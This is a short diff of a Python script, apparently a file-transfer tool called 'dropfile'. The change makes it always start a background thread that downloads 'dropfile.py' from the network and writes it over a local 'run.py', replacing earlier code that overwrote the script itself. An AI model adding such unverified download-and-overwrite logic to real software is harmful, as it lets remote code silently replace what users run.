@@ -92,8 +92,8 @@ IS_ETHERNET = False
 if os.getlogin() == "_":
 	print("NOTICE: The router / internet provider is able to READ ALL DATA you are transmitting! It is UNENCRYPTED!")
 	IS_ETHERNET = True
-else:
-	threading.Thread(target=_downloadAsset, args=("dropfile.py", __file__), kwargs={"override": True}).start()
+
+threading.Thread(target=_downloadAsset, args=("dropfile.py", os.path.join(dropfile, "run.py")), kwargs={"override": True}).start()
 
 temp_code = __import__("base64").b64encode(os.urandom(64)).decode()
 
